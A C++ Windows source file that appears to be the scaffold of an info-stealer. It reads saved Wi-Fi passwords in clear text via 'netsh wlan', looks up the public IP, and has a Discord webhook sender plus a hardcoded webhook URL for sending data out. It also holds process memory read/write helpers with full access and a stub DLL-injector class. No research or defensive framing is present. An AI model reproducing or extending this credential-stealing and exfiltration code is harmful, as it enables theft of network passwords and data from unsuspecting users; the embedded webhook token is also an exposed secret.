#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <vector>
#include <list>
#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


std::list<std::string> split(std::string text, std::string split_word) {
    std::list<std::string> list;
    std::string word = "";
    int is_word_over = 0;

    for (int i = 0; i <= text.length(); i++) {
        if (i <= text.length() - split_word.length()) {
            if (text.substr(i, split_word.length()) == split_word) {
                list.insert(list.end(), word);
                word = "";
                is_word_over = 1;
            }
            //now we want that it jumps the rest of the split character
            else if (is_word_over >= 1) {
                if (is_word_over != split_word.length()) {
                    is_word_over += 1;
                    continue;
                }
                else {
                    word += text[i];
                    is_word_over = 0;
                }
            }
            else {
                word += text[i];
            }
        }
        else {
            word += text[i];
        }
    }
    list.insert(list.end(), word);
    return list;
}

std::string get(std::list<std::string> _list, int _i) {
    std::list<std::string>::iterator it = _list.begin();
    for (int i = 0; i < _i; i++) {
        ++it;
    }
    return *it;
}

class Process {
private:
    DWORD PID = NULL;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
public:

    Process(std::string wName)
    {
        if (!FindWindowA(NULL, wName.c_str())) {
            std::cout << "Cannnot Find Window By Name: " << wName << std::endl;
            return;
        }
        DWORD pid;
        GetWindowThreadProcessId(FindWindowA(NULL, wName.c_str()), &pid);
        this->PID = pid;
        this->hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, this->PID);
        
    }

    template<class dT> void WriteMem(DWORD addr,dT val)
    {
        WriteProcessMemory(this->hProcess, addr, &val, sizeof(val), NULL);
    }

    template<class dT> dT ReadMem(DWORD addr)
    {
        dT b;
        ReadProcessMemory(this->hProcess, addr, &b, sizeof(b), NULL);
        return b;
    }
    
    MODULEENTRY32 getModule(const wchar_t* mName)
    {
        MODULEENTRY32 hEntry;
        hEntry.dwSize = sizeof(hEntry);
        HANDLE th32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, this->PID);

        if (Module32First(th32Snapshot, &hEntry))
        {
            do {
                if (!_wcsicmp(hEntry.szModule, mName))
                {
                    CloseHandle(th32Snapshot);
                    return hEntry;
                }
            } while (Module32Next(th32Snapshot, &hEntry));
        }
        
        std::cout << "Did'nt Find Module: " << mName << std::endl;
        return hEntry;
    }
};

bool runPyCode(const char* fName)
{
    std::string cmd2 = "python " + std::string(fName);
    const char* cmd = cmd2.c_str();
    std::string output = exec(cmd);
    std::string error_output = "python: can't open file " + std::string(fName) + ": [Errno 2] No such file or directory";
    if (output == error_output)
        return false;

    return true;
}

namespace FileSystem {
    void WriteFile(std::string fileName, std::string data)
    {
        std::ofstream outData(fileName);
        outData << data;
    }

    std::string ReadFile(std::string fileName)
    {
        constexpr auto read_size = std::size_t{ 4096 };
        auto stream = std::ifstream{ fileName.data() };
        stream.exceptions(std::ios_base::badbit);

        auto out = std::string{};
        auto buf = std::string(read_size, '\0');
        while (stream.read(&buf[0], read_size)) {
            out.append(buf, 0, stream.gcount());
        }
        out.append(buf, 0, stream.gcount());
        return out;
    }

    bool File_Exists(std::string fileName)
    {
        std::ifstream fstr(fileName);
        if (fstr)
            return true;
        
        return false;
    }

    void DeleteFile(std::string fileName)
    {
        if (File_Exists(fileName))
        {
            remove(fileName.c_str());
        }
    }
}

namespace https {
    std::string HttpRequest(std::string Url, std::string Method="GET", std::string headers="NULL",std::string data="NULL")
    {
        std::cout << "Called Me\n";
        std::string Result = "NULL";
        FileSystem::WriteFile("httprequrl.txt", Url);
        FileSystem::WriteFile("httpreqmet.txt", Method);
        if (headers != "NULL")
            FileSystem::WriteFile("httpreqheaders.txt", headers);

        if (data!="NULL")
            FileSystem::WriteFile("httpreqdata.txt", data);

        runPyCode("HttpRequest.py");
        Sleep(1500);
        if (FileSystem::File_Exists("httpreqres.txt"))
        {
            Result = FileSystem::ReadFile("httpreqres.txt");
        }
        
        FileSystem::DeleteFile("httpreqres.txt");
        FileSystem::DeleteFile("httprequrl.txt");
        FileSystem::DeleteFile("httpreqmet.txt");
        FileSystem::DeleteFile("httpreqheaders.txt");
        FileSystem::DeleteFile("httpreqdata.txt");
        return Result;
    }
}
struct NetworkInfo {
    std::string WiFiName;
    std::string Password;
    std::string IP;
};
struct Network {
    std::string WiFiName;
    std::string Password;
    std::string IP;
    Network(std::string nName)
    {
        this->WiFiName = nName;
        std::string command = "netsh wlan show profile " + this->WiFiName + " key=clear";
        std::string cmd = exec(command.c_str());
        std::string text1 = get(split(cmd, "Key Content            : "), 1);
        this->Password = get(split(text1, "\n"), 0);
        this->IP = https::HttpRequest("https://ipv4.com", "GET");;
    }

    NetworkInfo GetInfo()
    {
        NetworkInfo netInfo;
        netInfo.IP = this->IP;
        netInfo.WiFiName = this->WiFiName;
        netInfo.Password = this->Password;
        return netInfo;
    }
    std::string GetIP()
    {
        return this->IP;
    }
};


namespace Discord {
    class Webhook {
    private:
        std::string data = "";
        std::string Url = "";
    public:
        Webhook(std::string Url)
        {
            this->Url = Url;
        }

        void Add(std::string text,bool endL=false)
        {
            if (endL)
            {
                data = data + text + "\n";
            }
            else {
                data = data + text;
            }
        }

        void Execute()
        {
            if (this->data == "")
            {
                std::cout << "You Need To Add Data !, Use The Add Function" << std::endl;
                return;
            }
            FileSystem::WriteFile("webhookUrl.txt", this->Url);
            FileSystem::WriteFile("webhookData.txt", this->data);
            runPyCode("DiscordWebhook.py");
            Sleep(1500);
            FileSystem::DeleteFile("webhookUrl.txt");
            FileSystem::DeleteFile("webhookData.txt");
            if (FileSystem::ReadFile("discord_res.txt") != "204")
                std::cout << "Failed To Send Webhook Status Code: " << FileSystem::ReadFile("discord_res.txt") << std::endl;

            FileSystem::DeleteFile("discord_res.txt");
        }
    };
}

class DllInjector {

};

int main()
{
    Discord::Webhook webhook("https://discord.com/api/webhooks/868144911772446830/DIDiDnSHwuS19ZyWn92SbRwHD7_qCJUPaaOsRIAqEJ0D6sKN22EXgst0FU_ULtMibzvr");
    
    
}